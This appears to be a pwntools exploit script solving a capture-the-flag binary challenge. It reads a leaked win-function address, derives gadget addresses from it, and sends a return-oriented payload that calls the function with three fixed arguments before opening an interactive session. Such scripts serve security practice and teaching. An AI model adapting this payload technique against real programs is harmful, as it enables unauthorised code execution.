#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chal'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def attack(io):
    io.recvuntil(b'function: ')
    win_addr = int(io.recvline().strip(), 16)

    rdi_addr = win_addr - 6
    rsi_addr = win_addr - 4
    rdx_addr = win_addr - 2
    
    # win(0xdeadbeefcafebabe, 0x1122334455667788, 0xabcdabcdabcdabcd)
    payload = p64(rdi_addr)*10 + p64(0xdeadbeefcafebabe)
    payload += p64(rsi_addr) + p64(0x1122334455667788)
    payload += p64(rdx_addr) + p64(0xabcdabcdabcdabcd)
    payload += p64(win_addr)
    io.sendlineafter(b'input > ', payload)

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
